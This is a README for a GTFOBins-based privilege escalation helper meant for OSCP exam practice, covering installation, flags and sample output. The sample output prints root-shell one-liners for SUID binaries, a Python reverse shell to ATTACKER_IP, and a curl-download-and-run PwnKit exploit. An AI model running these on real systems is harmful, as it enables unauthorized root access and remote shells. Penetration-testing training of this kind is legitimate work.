# gtfobinGOD

**The ultimate GTFOBins privilege escalation tool for OSCP exam.**

Automatically identifies exploitable SUID binaries, sudo permissions, and Linux capabilities — then provides **instant copy-paste exploit commands**. No more manually browsing GTFOBins during exams.

## Quick Start

```bash
# Install
git clone https://github.com/bachrudinashari/gtfobinGOD.git
cd gtfobinGOD

# Dependencies (Kali usually has these pre-installed):
sudo apt install python3-requests python3-bs4 -y

# Usage — just type:
python3 gtfobinsuid.py                # auto run ALL checks (SUID + sudo + cap)
python3 gtfobinsuid.py --check vim    # quick check single binary
python3 gtfobinsuid.py --update-db    # update database from GTFOBins
```

## Features

- **279 binaries** with embedded exploit commands (offline, no internet needed)
- **3 modes**: SUID, Sudo (`sudo -l`), Capabilities (`getcap`)
- **Priority-sorted output**: Shell > Reverse Shell > File Read > File Write
- **Pipe-friendly**: works in non-TTY shells, webshells, reverse shells
- **`--exam` mode**: zero noise, only actionable results
- **Smart normalization**: `python3.8`, `vim.basic`, `perl5.30.0` all resolve correctly
- **Custom hints**: PwnKit, Screen 4.5.0, Docker group, LXD, and 25+ known vectors
- **JSON output**: for integration with other tools
- **Database update**: `--update-db` scrapes latest GTFOBins entries
- **Cross-platform**: works on Linux, macOS, Windows (for prep)

## Installation

### Ubuntu / Kali Linux

```bash
git clone https://github.com/bachrudinashari/gtfobinGOD.git
cd gtfobinGOD

# Dependencies (choose one):
sudo apt install python3-requests python3-bs4 -y          # recommended for Kali
# OR
pip3 install -r requirements.txt --break-system-packages  # alternative
```

### Windows (for exam preparation)

```powershell
git clone https://github.com/bachrudinashari/gtfobinGOD.git
cd gtfobinGOD
pip install -r requirements.txt
```

### One-liner (download + run, no install)

```bash
wget -q https://raw.githubusercontent.com/bachrudinashari/gtfobinGOD/main/gtfobinsuid.py -O /tmp/gtfobinGOD.py
wget -q https://raw.githubusercontent.com/bachrudinashari/gtfobinGOD/main/db_commands.py -O /tmp/db_commands.py
wget -q https://raw.githubusercontent.com/bachrudinashari/gtfobinGOD/main/db_hints.py -O /tmp/db_hints.py
wget -q https://raw.githubusercontent.com/bachrudinashari/gtfobinGOD/main/db.txt -O /tmp/db.txt
find / -perm -u=s -type f 2>/dev/null | python3 /tmp/gtfobinGOD.py --exam
```

## Usage

### SUID Enumeration (most common)

```bash
# Pipe find output directly
find / -perm -u=s -type f 2>/dev/null | python3 gtfobinsuid.py --exam

# SGID too
find / -perm -g=s -type f 2>/dev/null | python3 gtfobinsuid.py --exam

# Interactive mode (if no pipe)
python3 gtfobinsuid.py
```

### Sudo Enumeration

```bash
# Pipe sudo -l output
sudo -l | python3 gtfobinsuid.py --sudo --exam

# Or paste manually
python3 gtfobinsuid.py --sudo
```

### Capabilities Enumeration

```bash
# Pipe getcap output
getcap -r / 2>/dev/null | python3 gtfobinsuid.py --capabilities --exam

# Short flag
getcap -r / 2>/dev/null | python3 gtfobinsuid.py --cap --exam
```

### Quick Single Binary Check

```bash
# Check one binary
python3 gtfobinsuid.py --check python3
python3 gtfobinsuid.py --check vim --mode sudo
python3 gtfobinsuid.py --check perl --mode capabilities
```

### Update Database

```bash
# Fetch latest entries from GTFOBins (requires internet)
python3 gtfobinsuid.py --update-db
```

### JSON Output

```bash
find / -perm -u=s -type f 2>/dev/null | python3 gtfobinsuid.py --json
```

## Example Output

```
$ find / -perm -u=s -type f 2>/dev/null | python3 gtfobinsuid.py --exam

[CRITICAL] python3.8 — SUID Shell | https://gtfobins.github.io/gtfobins/python/
  python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

[CRITICAL] find — SUID Shell | https://gtfobins.github.io/gtfobins/find/
  find . -exec /bin/sh -p \; -quit

[CRITICAL] vim.basic — SUID Shell | https://gtfobins.github.io/gtfobins/vim/
  vim -c ':!/bin/sh -p'

[CRITICAL] pkexec — SUID Known Vuln
  # PwnKit CVE-2021-4034 — universal Linux LPE (polkit < 0.120)
  # One-liner: curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit && chmod +x PwnKit && ./PwnKit

[HIGH] python3.8 — SUID Reverse Shell | https://gtfobins.github.io/gtfobins/python/
  python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-p"])'

[MEDIUM] find — SUID File Read | https://gtfobins.github.io/gtfobins/find/
  find /path/to/file -exec cat {} \;

============================================================
[!] BINARIES IN NON-STANDARD PATHS (investigate manually):
============================================================
  /usr/local/bin/custom_binary

  These may be custom/vulnerable binaries. Check:
  - file <binary>    # what type?
  - strings <binary> # hardcoded paths/commands?
  - ltrace <binary>  # library calls?

[*] Summary: 14 findings | 6 shells | 4 file reads
```

## Flags

| Flag | Description |
|------|-------------|
| `--exam` | Clean output: no banner, only priority 1-3 results |
| `--sudo` | Parse `sudo -l` output |
| `--capabilities` / `--cap` | Parse `getcap` output |
| `--check BINARY` | Quick check single binary |
| `--mode suid/sudo/capabilities` | Mode for `--check` (default: suid) |
| `--online` | Force online GTFOBins check |
| `--offline` | Force offline mode |
| `--update-db` | Update db.txt from GTFOBins |
| `--json` | JSON output |
| `--no-banner` | Hide banner |
| `--no-color` | Disable colors |
| `--db PATH` | Custom db.txt path |

## Priority System

| Priority | Label | Meaning |
|----------|-------|---------|
| 1 | CRITICAL | Direct shell — instant root |
| 2 | HIGH | Reverse shell |
| 3 | MEDIUM | File read (shadow, SSH keys, proof.txt) |
| 4 | LOW | File write (SSH keys, passwd, crontab) |
| 5 | INFO | Limited / needs extra work |

## File Structure

```
gtfobinGOD/
├── gtfobinsuid.py      # Main script (30KB)
├── db_commands.py      # Embedded exploit commands for 279 binaries (69KB)
├── db_hints.py         # Custom hints for 25+ OSCP-common vectors (9KB)
├── db.txt              # Offline GTFOBins binary list (updatable)
├── requirements.txt    # Python dependencies
└── README.md
```

## Dependencies

- Python 3.6+
- `requests` — for online mode and `--update-db` (pre-installed on Kali)
- `beautifulsoup4` — for `--update-db` only

**Note**: The tool works fully offline without any dependencies. `requests` and `beautifulsoup4` are only needed for `--online` mode and `--update-db`.

## OSCP Exam Cheatsheet

```bash
# Transfer to target (from your Kali):
python3 -m http.server 80
# On target:
wget http://YOUR_IP/gtfobinsuid.py -O /tmp/g.py
wget http://YOUR_IP/db_commands.py -O /tmp/db_commands.py
wget http://YOUR_IP/db_hints.py -O /tmp/db_hints.py
wget http://YOUR_IP/db.txt -O /tmp/db.txt
cd /tmp

# Run all three checks:
find / -perm -u=s -type f 2>/dev/null | python3 g.py --exam
sudo -l 2>/dev/null | python3 g.py --sudo --exam
getcap -r / 2>/dev/null | python3 g.py --cap --exam
```

## Credits

- Inspired by [strikoder/gtfobinSUID](https://github.com/strikoder/gtfobinSUID)
- Exploit data sourced from [GTFOBins](https://gtfobins.github.io/)

## License

GPL-3.0
